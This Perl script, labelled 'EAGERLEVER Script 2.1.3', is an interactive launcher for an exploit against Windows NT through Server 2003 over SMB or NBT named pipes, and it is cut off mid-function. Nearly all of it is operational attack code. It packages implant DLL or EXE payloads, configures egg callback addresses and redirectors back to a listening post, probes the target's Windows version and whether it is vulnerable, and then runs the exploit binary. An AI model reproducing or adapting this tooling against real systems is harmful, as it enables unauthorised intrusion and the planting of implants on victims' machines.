


use strict;
use vars qw($VERSION);

$::VERSION = "EAGERLEVER Script: 2.1.3";
print "\n\n$::VERSION\n\n";



use FindBin;				
use lib "$FindBin::Bin";	
use Getopt::Long;			
use Cwd;					

use lib "$FindBin::Bin\\..\\..\\Resources\\Perl";
use ExploitUtils qw(
	$EU_LOGFILE
	$EU_VERBOSE
	$EU_BATCHMODE
	EU_LogInit
	EU_Log
	EU_ExitMessage
	EU_GetInput
	EU_GetExistingDir
	EU_GetIP
	EU_GetLocalIP
	EU_GetRootDir
	EU_GetPort
	EU_RunCommand
	EU_GetAddr
);


use vars qw($RIDEAREA $PAYLOAD_DLL $PAYLOAD_EXE $EXPLOIT_EXE @DEPFILES);

my	%opts = ();
GetOptions(\%opts, "v", "h", "q|?", "b", "e=s", "f=s", "d=s", "t=s", "l=s", "c=s", "x=s", "n=s") or &print_script_usage(0);

if (scalar(@ARGV) > 0 ) {
  &EU_Log(1, "Extraneous arguments found on command line: @ARGV");
  &EU_Log(1, "Arguments will be ingnored");
  while(@ARGV) {shift;}
}

if (!defined($opts{"e"})) {
	&EU_Log(1, "A -e option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"f"})) {
	&EU_Log(1, "A -f option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"x"})) {
	&EU_Log(1, "A -x option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"l"})) {
	&EU_Log(1, "A -l option must be supplied.");
	&print_usage(0);
}

if (!defined($opts{"n"})) {
	&EU_Log(1, "A -n option must be supplied.");
	&print_usage(0);
}

$::RIDEAREA		= "Resources\\Tools\\ridearea2.exe";	

$::LP_DLL	= "$opts{l}";					
$::PAYLOAD_DLL	= "$opts{f}";				
$::PAYLOAD_EXE	= "$opts{x}";				
$::PAYLOAD_EXE_NAME = "$opts{n}";			
$::EXPLOIT_EXE	= "$opts{e}\\ELV.exe";					

$::EGG_SOCKET_NONE			= "1";			
$::EGG_SOCKET_NEW			= "2";			
$::EGG_SOCKET_REUSE			= "3";			

$::IMPLANT_SOCKET_NEW		= "2";			
$::IMPLANT_SOCKET_MAINTAIN	= "3";			

$::RUN_EXPLOIT				= "1";			
$::RUN_PROBE_1				= "2";			


my $work_dir       = $opts{"d"} if (defined $opts{"d"});
my $root_dir       = $opts{"c"} if (defined $opts{"c"});
my $TargetIpIn      = $opts{"t"} if (defined $opts{"t"});


@DEPFILES = ($::RIDEAREA, $::EXPLOIT_EXE);


my	$logfile_prefix		= "ELV_";			
my	$logfile_suffix		= "_script.log";	
my	$filename_suffix	= "_payload.bin";	

my	$TargetIp			= $TargetIpIn;		
my	$TargetPort			= 0;				
my	$ImplantSocketStatus= $::IMPLANT_SOCKET_NEW;	
my	$TimeOutValue		= 0;				

my	$PayloadFile		= "";				
my	$PayloadType		= "";				
my	$PayloadDropName	= "N/A";			

my	$EggSocketStatus	= $::EGG_SOCKET_REUSE;	
my  $EggCallbackIp			= "127.0.0.1";		
my  $EggCallbackPort		= 0;				

my	$ExternalRideArea	= 0;				
my	$RA_Payload			= "N/A";

my $TransProt_none		=0;
my $TransProt_tcp		=1;
my $TransProt_udp		=2;
my $TargetTransportProtocol	= $TransProt_none;		
my $TransportProtocol = "undefined";

my $AppProt_none	= 0;
my $AppProt_NA		= 1;
my $AppProt_nbt		= 2;
my $AppProt_smb		= 3;
my $AppProt_smtp	= 4;
my $AppProt_pop		= 5;
my $AppProt_http	= 6;
my $AppProt_ftp		= 7;
my $AppProt_telnet	= 8;
my $AppProt_imap	= 9;
my $TargetApplicationProtocol = $AppProt_none;				
my $ApplicationProtocol	= "undefined";	

my $RpcConnection =  "";									


my $RPCTOUCHII_RUN_GENERAL_PROBE			= 1;
my $RPCTOUCHII_RUN_REGPROBE					= 2;
my $RPCTOUCHII_RUN_XP_SP0_PROBE	            = 3; 
my $RPCTOUCHII_RUN_RPC_INTERFACE_PORT       = 4;
my $RPCTOUCHII_RUN_WINDOWS_2000_SP4_PROBE	= 5;
my $RPCTOUCHII_RUN_KB823980_PROBE           = 6; 
my $RPCTOUCHII_RUN_KB824146_PROBE			= 7; 
my $RPCTOUCHII_RUN_WINDOWS_2003_PROBE		= 8; 



my $not			= "NOT GOOD";
my $w9x			= "Windows 9x";
my $nt4			= "Windows NT 4.0";
my $w2k			= "Windows 2000";
my $w2ksp0123	= "Windows 2000 Service Pack 0, 1, 2, or 3";
my $w2ksp4		= "Windows 2000 Service Pack 4";
my $wxp			= "Windows XP";
my $wxpsp0		= "Windows XP Service Pack 0";
my $wxpsp1		= "Windows XP Service Pack 1";
my $wxpsp2		= "Windows XP Service Pack 2";
my $w2kXp		= "Windows 2000 XP" ;
my $wxp2003		= "Windows XP Server 2003" ;
my $ws2003		= "Windows Server 2003";
my $ws2003sp1	= "Windows Server 2003 Service Pack 1";




my	$WindowsVersion		= 0;				
my	$TargetServerIp		= "$TargetIpIn";	


&print_usage(1) if (defined $opts{"h"});	
&print_usage(0) if (defined $opts{"q"});	

$ExploitUtils::EU_VERBOSE   = 1 if (defined $opts{"v"});	
$ExploitUtils::EU_BATCHMODE = 1 if (defined $opts{"b"});	



if ($ENV{"OS"} ne "Windows_NT") {
    &EU_ExitMessage(1,"This script requires Windows NT or Windows 2000");
}


$work_dir = &EU_GetExistingDir("Enter pathname for operation's working directory", $work_dir, 1);
$root_dir = &EU_GetRootDir($root_dir,@::DEPFILES);



&EU_LogInit($logfile_prefix, $logfile_suffix, $work_dir);
&EU_Log(0,"$::VERSION");



&EU_Log(0,"\nChanging to working directory: $work_dir");
chdir $work_dir || &EU_ExitMessage(1,"Unable to change to working directory: $work_dir");



($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
 $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
 $EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
 $WindowsVersion, $TargetServerIp) =
	&validate_parms($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	$TimeOutValue, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, 
	$EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
	$WindowsVersion, $TargetServerIp);

my $answer;
if(!$EU_BATCHMODE) {
	$answer = &EU_GetInput("\nReady to begin exploit ([y],n,quit)? ", "y");
	&EU_ExitMessage(0,"User terminated script")  if ($answer ne "y" and $answer ne "Y");
}


if ($ExternalRideArea == 1) {


	my $payload_name_format = "${work_dir}\\${logfile_prefix}%04d%02d%02d_%02d%02d%02d${filename_suffix}"; 
	my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday, $isdst) = gmtime(time);

	$year += 1900;
	$mon  += 1;

	$RA_Payload = sprintf($payload_name_format,$year,$mon,$mday,$hour,$min,$sec);


	if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
		if ($PayloadDropName eq "N/A") {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 17 -a 8 -t m");
			}
		}
		else {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m -l m");	
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 17 -a 8 -t m");	
			}
		}
	}
	elsif( $ImplantSocketStatus eq $::IMPLANT_SOCKET_NEW ) {
		if ($PayloadDropName eq "N/A") {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -o \"$RA_Payload\" -f 13 -a 3 -t m");
			}
		}
		else {
			if ($PayloadType eq "d") {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t m -l m");	
			}
			else {
				&EU_RunCommand("\"$root_dir\\$::RIDEAREA\" -i \"$PayloadFile\" -x $PayloadType -d $PayloadDropName -o \"$RA_Payload\" -f 13 -a 3 -t m");	
			}
		}
	}
}






my $flags;
if($ExploitUtils::EU_VERBOSE) { $flags = "-v"; }
else { $flags = ""; }

&EU_Log(1,"\nExploit will launch in a separate window. Follow the status messages");
&EU_Log(1,"in the new window to determine if it succeeds.");
&EU_Log(1,"\nLaunching exploit...");


my $ImplantPayload = "N/A";
if ($ExternalRideArea == 1) {
	$ImplantPayload = $RA_Payload;
}
else {
	$ImplantPayload = $PayloadFile;
}

if ($ExternalRideArea == 1) {
	&EU_RunCommand("start \"ELV Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -l \"$root_dir\\$::LP_DLL\" -z -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -h $TargetServerIp\"");
}
else {
	if ($PayloadDropName eq "N/A") {
		&EU_RunCommand("start \"ELV Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -x $PayloadType -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -h $TargetServerIp\"");
	}
	else {
		&EU_RunCommand("start \"ELV Exploit\" cmd /T:9F /K \"\"$root_dir\\$::EXPLOIT_EXE\" -r $::RUN_EXPLOIT	-i $TargetIp -p $TargetPort -u $EggSocketStatus -c $ImplantSocketStatus -I $EggCallbackIp -P $EggCallbackPort	-f \"$ImplantPayload\" -x $PayloadType -q $PayloadDropName -l \"$root_dir\\$::LP_DLL\" -o $TimeOutValue -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -w $WindowsVersion -h $TargetServerIp\"");
	}
}



my $cur_dir = cwd();
chdir $cur_dir || &EU_ExitMessage(1,"Unable to switch back to initial directory: $cur_dir");

&EU_ExitMessage(0,"\nDone with $::0.");



sub print_usage() {
	my ($verbose) = @_;
	print "$::VERSION\n";

	print qq~
Usage: $::0 [-v] [-h] [-?] [-b]
             [-d <working directory>] [-e <exploits directory>]
			 [-t <target IP>] [-l <lp dll>]
             [-f <payload dll>] 
			 [-x <payload exe> [-n <Payload Dropname>]]
	 
~;

	if ($verbose) {
		print qq~

  -v                    verbose mode. Default non-verbose mode.

  -h                    Print this help information.

  -?                    Print abbreviated help information.

  -b                    Batch (non-interactive) mode. Default interactive mode.

  -d <working directory> Working Directory
                        Top-level directory where operation's files will be
                        generated. Default E:\.

  -e <exploits directory> Exploits Directory
                        Top-level directory containing exploit files.
						Default one directory up from directory containing this script.

  -t <target IP>        Target IP address.
                        Default derived as last part of working directory name.
  
  -l <lp dll>           Filename of the listening post dll.

  -f <payload dll>      Filename of the implant payload (dll).

  -x <payload exe>      Filename of the implant payload (exe).

  -n <payload dropname> Filename to be used for the dropped executable 

~;
	}

	&EU_ExitMessage(1,"End of help.");
}


sub validate_parms() {
	my ($work_dir, $root_dir, $TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName,
	   $TimeOutValue,$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
	   $EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
	   $WindowsVersion, $TargetServerIp) = @_;

	my ($continue, $retcode, $vol, $dir);
	my ($redirectFlag);
	my $OrgTargetIp			= $TargetIp;
	my $LPRedirectionIp		= "127.0.0.1";
	my $LPRedirectionPort	= "undefined";
	my $DestinationIp		= $TargetIp;
	my $DestinationPort		= "undefined";
	my $TransportProtocolSelected = 0;
	my $RideAreaOpt			= "Exploit called";

	my ($LocalIp);


	my $RpcTouchProtocol			= "undefined";





	$LocalIp = &EU_GetLocalIP("Enter the local IP Address", $LocalIp);
	&EU_Log(0, "Enter the local IP Address:  $LocalIp");
	while (1) {



		&EU_Log(1,"\nSelect Payload file to send:\n");
		&EU_Log(1,"   0) $::PAYLOAD_DLL");		
		&EU_Log(1,"   1) $::PAYLOAD_EXE ($::PAYLOAD_EXE_NAME)");		
		while(1) {
			$retcode = &EU_GetInput("\nEnter selection [0]: ", "0");
			&EU_Log(0, "\nEnter selection [0]: $retcode");

			if($retcode eq "0") {
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_DLL\n");
				$PayloadFile = $::PAYLOAD_DLL;
				$PayloadType = "d";
				$PayloadDropName = "N/A";
			}
			elsif($retcode eq "1") { 
				&EU_Log(1,"\nUsing Payload file $::PAYLOAD_EXE\n");
				$PayloadFile = $::PAYLOAD_EXE;
				$PayloadType = "e";
				$PayloadDropName = $::PAYLOAD_EXE_NAME;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 



		&EU_Log(1,"\nRideArea option:\n");
		&EU_Log(1,"   0) Have exploit call RideArea [DEFAULT]");		
		&EU_Log(1,"   1) Have the script call RideArea.  (RideArea is newer than the exploit)");		
		while(1) {
			$ExternalRideArea = &EU_GetInput("\nEnter selection [0]: ", $ExternalRideArea);
			&EU_Log(0, "\nEnter selection [0]: $ExternalRideArea");

			if($ExternalRideArea eq "0") {
				$RideAreaOpt = "Exploit called";
			}
			elsif($ExternalRideArea eq  "1") { 
				$RideAreaOpt = "Script called";
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
			}
			last;
		} 


		&EU_Log(1,"\nSelect the Transport Protocol Sequence To Use:\n");
		&EU_Log(1,"   1) NBT/Named Pipe (TCP Port 139 is accessible)");
		&EU_Log(1,"   2) SMB/Named Pipe (TCP Port 445 is accessible)");
		while(1) {
			$TransportProtocolSelected = &EU_GetInput("\nEnter selection [2]: ", "2");
			&EU_Log(0, "\nEnter selection [2]: $TransportProtocolSelected");
			if ($TransportProtocolSelected eq "1") {
				$TargetTransportProtocol	= $TransProt_tcp;
				$TransportProtocol			= "tcp";
				$TargetApplicationProtocol	= $AppProt_nbt;
				$ApplicationProtocol		= "nbt";
				$RpcConnection				= "-rpc";
				$RpcTouchProtocol			= "rpc_nbt";
				$DestinationPort			= 139;
			}
			elsif($TransportProtocolSelected eq "2") {
				$TargetTransportProtocol	= $TransProt_tcp;
				$TransportProtocol			= "tcp";
				$TargetApplicationProtocol	= $AppProt_smb;
				$ApplicationProtocol		= "smb";
				$RpcConnection				= "-rpc";
				$RpcTouchProtocol			= "rpc_smb";
				$DestinationPort			= 445;
			}
			elsif($TransportProtocolSelected eq "3") {
				$TargetTransportProtocol	= $TransProt_udp;
				$TransportProtocol			= "udp";
				$TargetApplicationProtocol	= $AppProt_NA;
				$ApplicationProtocol		= "NA";
				$RpcConnection				= "-rpc";
				$RpcTouchProtocol			= "rpc_udp";
				$DestinationPort			= 135;
			}
			else {
				&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
				next;
				}
			last;
		}  


		$retcode = &EU_GetInput("\nWill this operation be REDIRECTED ([y],n)? ", "y");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") ) { $redirectFlag = 1; }
		else { $redirectFlag = 0; }



		if( $redirectFlag == 0 ) {


			$EggCallbackIp = $LocalIp;
			$TargetIp = $OrgTargetIp;  
			$TargetIp = &EU_GetIP("\nEnter the target IP Address", $TargetIp);
			&EU_Log(0, "Enter the target IP Address:  $TargetIp");
			$DestinationIp = $TargetIp;

			$DestinationPort = &EU_GetPort("\nEnter the target Port", $DestinationPort);
			&EU_Log(0, "Enter the target Port:  $DestinationPort");

			$TargetPort = $DestinationPort;
			$TargetServerIp = $TargetIp;


			($ImplantSocketStatus, $EggSocketStatus) = &get_socket_options($ImplantSocketStatus, $EggSocketStatus, $PayloadType);

			if( $EggSocketStatus eq $::EGG_SOCKET_NEW) {

				&EU_Log(1, "\nThe ELV Exploit Payload must callback in order to upload the Implant Payload.");

				&EU_Log(1, "The local IP Address should be used as the Egg callback IP Address.");

				$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback IP Address", $LocalIp);
				&EU_Log(0, "Enter the Egg callback IP Address:  $EggCallbackIp");

				$EggCallbackPort = $DestinationPort * 10 + 1;
				while(1) {
					$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
					&EU_Log(0, "Enter the Egg callback Port:  $EggCallbackPort");
					if($EggCallbackPort eq "0") {
						&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
						next;
					}
					last;
				} 
			}

		}

		else {



			$LPRedirectionIp = &EU_GetIP("\nEnter the LP Redirection IP address", $LPRedirectionIp);
			&EU_Log(0, "Enter the LP Redirection IP address:  $LPRedirectionIp");
			$TargetIp = $LPRedirectionIp;

			$LPRedirectionPort = $DestinationPort * 10;
			if($RpcTouchProtocol eq "rpc_nbt") { 
				&EU_Log(1, "\nELV must be directed to the Target on TCP Port 139.");
				$LPRedirectionPort = &EU_GetPort("Enter the LP Redirection Port No.", $LPRedirectionPort);
				&EU_Log(0,"Enter the LP Redirection Port No.: $LPRedirectionPort");

				$TargetServerIp = &EU_GetIP("\nEnter the NBT Server's IP address (AKA: the Actual Target's IP Address)", $DestinationIp);
				&EU_Log(0,"Enter the NBT Server's IP address: $TargetServerIp");
			}
			elsif($RpcTouchProtocol eq "rpc_smb") { 
				&EU_Log(1, "\nELV must be directed to the Target on TCP Port 445.");
				$LPRedirectionPort = &EU_GetPort("Enter the LP Redirection Port No.", $LPRedirectionPort);
				&EU_Log(0,"Enter the LP Redirection Port No.: $LPRedirectionPort");

				$TargetServerIp = &EU_GetIP("\nEnter the SMB Server's IP address (AKA: the Actual Target's IP Address)", $DestinationIp);
				&EU_Log(0,"Enter the SMB Server's IP address: $TargetServerIp");
			}
			$TargetPort = $LPRedirectionPort;


			($ImplantSocketStatus, $EggSocketStatus) = &get_socket_options($ImplantSocketStatus, $EggSocketStatus, $PayloadType);

			if( $EggSocketStatus eq $::EGG_SOCKET_NEW) {


				&EU_Log(1, "\n");
				&EU_Log(1, "*************************************************************************");
				&EU_Log(1, "* The ELV Exploit Payload must callback in order to upload the Implant *");
				&EU_Log(1, "* Payload.  The callback IP Address MUST be that of the Middle          *");
				&EU_Log(1, "* Redirector.  The callback Port MUST be the same number on both the    *");
				&EU_Log(1, "* Middle Redirector and the local machine, else redirection will fail.  *");
				&EU_Log(1, "* The local machine uses this port to listen for the callback, and the  *");
				&EU_Log(1, "* ELV Exploit Payload uses it to call back to the local machine        *");
				&EU_Log(1, "* through the Redirector.                                               *");
				&EU_Log(1, "*************************************************************************");

				$EggCallbackIp = &EU_GetLocalIP("\nEnter the Egg callback(Middle Redirector) IP ", $EggCallbackIp);
				&EU_Log(0, "Enter the Egg callback(Middle Redirector) IP Address:  $EggCallbackIp");

				$EggCallbackPort = $DestinationPort * 10 + 1;
				while(1) {
					$EggCallbackPort = &EU_GetPort("\nEnter the Egg callback Port", $EggCallbackPort);
					&EU_Log(0, "Enter the Egg callback Port:  $EggCallbackPort");
					if($EggCallbackPort eq "0") {
						&EU_Log(1, "Invalid Port number. Try again or enter 'quit'.");
						next;
					}
					last;
				} 
			}
		}


		&EU_Log(1, "\nThe default time-out value for the target connection is 60 sec.");
		&EU_Log(1, "(You may want to increase this value if the network is exceptionally slow.)");
		$retcode = &EU_GetInput("Use default value of 60 sec ([y],n)? ", "y");
		&EU_Log(0, "Use default value of 60 sec ([y],n)?  $retcode");

		if( ($retcode eq "y") or ($retcode eq "yes") or ($retcode eq "Y") or ($retcode eq "YES") or ($retcode eq "60") ) {
			$TimeOutValue = "60";
		}
		else {
			$TimeOutValue = &EU_GetInput("Enter new time-out value (greater than 60): ");
			&EU_Log(0, "Enter new time-out value (greater than 60):  $TimeOutValue");
		}



		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tLocal IP              : $LocalIp");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
			&EU_Log(1,"\tTarget IP             : $DestinationIp");
			&EU_Log(1,"\tTarget Port           : $DestinationPort");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
			}
			else {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp");
			}
			&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain (Use existing connection for the entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close (Existing connection will NOT be used for the entire operation.)");
		}


		&EU_Log(1,"\tTransport Protocol    : $TransportProtocol");
		&EU_Log(1,"\tApplication Protocol  : $ApplicationProtocol");
		&EU_Log(1,"\tRpc Connection flag   : $RpcConnection");
		
		&EU_Log(1,"\tNetwork Time Out      : $TimeOutValue sec");


		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			; 
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}


		my $touchFlag			= "n";		
		$WindowsVersion			= $not;		

		$touchFlag = &EU_GetInput("\nUse ELV touch option to obtain the Windows Version ([y],n)? ", "y");

		if(($touchFlag eq "y") or ($touchFlag eq "Y") or ($touchFlag eq "yes") or ($touchFlag eq "YES")) {
			my $bVulnerable = 0;
			my $bError = 0;



			($WindowsVersion, $bVulnerable, $bError) = &run_elvtouch($root_dir,$TargetIp,$TargetPort,$TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $TargetServerIp, $TimeOutValue,$::RUN_PROBE_1);


			if( ($WindowsVersion eq $not) or ($bVulnerable == 0) or ($bError == 1) ) {


				&EU_Log(1, "\n*** WARNING *** Recommend you STOP and re-evaluate before proceeding!");
				$continue = &EU_GetInput("\nDo you wish to continue (y,n,[quit])? ", "quit");
				&EU_Log(0, "\nDo you wish to continue (y,n,[quit])? $continue");

				if( ($continue eq "q") or ($continue eq "Q") or ($continue eq "quit") or ($continue eq "QUIT") ) {
					&EU_ExitMessage(1,"User terminated script\n");
				}
				elsif( ($continue eq "n") or ($continue eq "N") or ($continue eq "no") or ($continue eq "NO") ) {
					&EU_Log(1, "Returning to top of script...\n");
					next;
				}
				else { 
					$touchFlag = "n";
				}
			}
			else {


				$retcode = &EU_GetInput("\nUse \"$WindowsVersion\" as the target Windows Version ([y],n)? ", "y");
				if( ($retcode eq "n") or ($retcode eq "N") or ($retcode eq "no") or ($retcode eq "NO") ) {
					$retcode = &EU_GetInput("\n*CAUTION* Are you CERTAIN that you wish to defy the probe results (y,[n])? ", "n");
				
					if( ($retcode eq "n") or ($retcode eq "N") or ($retcode eq "no") or ($retcode eq "NO") ) {
						&EU_Log(1,"Good. Using probe results for the target machine type.\n");
					}
					else {
						$touchFlag = "n";
					}
				}
			}

		}

		if(($EggSocketStatus eq $::EGG_SOCKET_REUSE) and ($WindowsVersion eq $nt4)) {
			&EU_Log(1, "\nERROR: Egg socket option REUSE is not supported on $nt4.");
			&EU_Log(1, "Please select the option to create a NEW socket.");
			next;
		}



		&EU_Log(1,"\nConfirm Network Parameters:");
		&EU_Log(1,"\tRoot Directory        : $root_dir");
		&EU_Log(1,"\tLocal IP              : $LocalIp");
		&EU_Log(1,"\tPayload file          : $PayloadFile");
		&EU_Log(1,"\tPayload drop name     : $PayloadDropName");
		&EU_Log(1,"\tRideArea Option       : $RideAreaOpt");
		if( $redirectFlag ) {
			&EU_Log(1,"\tUsing Redirection     : True");
			&EU_Log(1,"\tLP Redirector IP      : $LPRedirectionIp");
			&EU_Log(1,"\tLP Redirector Port    : $LPRedirectionPort");
		}
		else {
			&EU_Log(1,"\tUsing Redirection     : False");
		}
			&EU_Log(1,"\tTarget IP             : $DestinationIp");
			&EU_Log(1,"\tTarget Port           : $DestinationPort");

		if( $EggSocketStatus eq $::EGG_SOCKET_NEW ) {
			&EU_Log(1,"\tEgg Socket Status     : New");
			if( $redirectFlag ) {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp (Middle Redirector)");
			}
			else {
				&EU_Log(1,"\tEgg Callback IP       : $EggCallbackIp");
			}
			&EU_Log(1,"\tEgg Callback Port     : $EggCallbackPort");
		}
		elsif( $EggSocketStatus eq $::EGG_SOCKET_REUSE ) {
			&EU_Log(1,"\tEgg Socket Status     : Reuse");
		}
		else {
			&EU_Log(1,"\tEgg Socket Status     : None");
		}

		if( $ImplantSocketStatus eq $::IMPLANT_SOCKET_MAINTAIN ) {
			&EU_Log(1,"\tExploit Socket Status : Maintain (Use existing connection for the entire operation.)");
		}
		else {
			&EU_Log(1,"\tExploit Socket Status : Close (Existing connection will NOT be used for the entire operation.)");
		}


		&EU_Log(1,"\tTransport Protocol    : $TransportProtocol");
		&EU_Log(1,"\tApplication Protocol  : $ApplicationProtocol");
		&EU_Log(1,"\tRpc Connection flag   : $RpcConnection");
		
		&EU_Log(1,"\tNetwork Time Out      : $TimeOutValue sec");
		&EU_Log(1,"\tWindows Version       : $WindowsVersion");


		$continue = &EU_GetInput("\nContinue with the current values ([y],n,quit)? ","y");
		&EU_Log(0, "\nContinue with the current values ([y],n,quit)? $continue");

		if( ($continue eq "y") or ($continue eq "yes") or ($continue eq "Y") or ($continue eq "YES") ) {
			last;
		} 
		elsif( ($continue eq "q") or ($continue eq "quit") or ($continue eq "Q") or ($continue eq "QUIT") ) {
			&EU_ExitMessage(1,"User terminated script\n");
		}
		else {
			&EU_Log(1, "Returning to top of script...\n");
			next;
		}

	} 


	if( $WindowsVersion eq $nt4 ) { $WindowsVersion = 2; }
	elsif( $WindowsVersion eq $w2k ) { $WindowsVersion = 3; }
	elsif( $WindowsVersion eq $wxp ) { $WindowsVersion = 4; }
	elsif( $WindowsVersion eq $ws2003 ) { $WindowsVersion = 5; }
	else {$WindowsVersion = 0;}

	return ($TargetIp, $TargetPort, $EggSocketStatus, $ImplantSocketStatus, $PayloadFile, $PayloadType, $PayloadDropName, $TimeOutValue,
	        $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection,
			$EggCallbackIp, $EggCallbackPort, $ExternalRideArea,
			$WindowsVersion, $TargetServerIp);
}







sub get_socket_options()
{
	my ($ImplantSocketStatus, $EggSocketStatus, $PayloadType) = @_;

	my $opt;
	my $EggSocketOption0	= "Re-use existing socket connection";
	my $EggSocketOption1	= "Create a new socket connection";
	my $ImplantSocketOption	= "Maintain this socket for the Implant connection with the LP";


	&EU_Log(1,"\nThe ELV Exploit Payload Must Call-back in Order to Upload the Implant Payload.");
	&EU_Log(1,"Select the Socket Option To Use:\n");
	&EU_Log(1,"   0) $EggSocketOption0");		
	&EU_Log(1,"   1) $EggSocketOption1");		
	while(1) {
		$opt = &EU_GetInput("\nEnter selection [0]: ", "0");
		&EU_Log(0, "\nEnter selection [0]: $opt");

		if ($opt eq "0") {
			$EggSocketStatus = $::EGG_SOCKET_REUSE;
		}
		elsif($opt eq "1") {
			$EggSocketStatus = $::EGG_SOCKET_NEW;
		}
		else {
			&EU_Log(1, "Invalid option. Try again or enter 'quit'.");
			next;
		}
		last;
	}  



	$ImplantSocketStatus = $::IMPLANT_SOCKET_NEW;

	if($PayloadType eq "d") {
		if($EggSocketStatus eq $::EGG_SOCKET_NEW) {
			$opt = &EU_GetInput("\n$ImplantSocketOption ([y],n)? ", "y");
			&EU_Log(0, "\n$ImplantSocketOption ([y],n)?  $opt");
			if( $opt eq "y" or $opt eq "Y" or  $opt eq "yes" or $opt eq "YES" ) {
				$ImplantSocketStatus = $::IMPLANT_SOCKET_MAINTAIN;
			}
		}
		else {
			&EU_Log(1,"\nWhen re-using existing socket connection, operator must reconnect to the ");
			&EU_Log(1,"implant for the operation.  Original socket will be closed after the target");
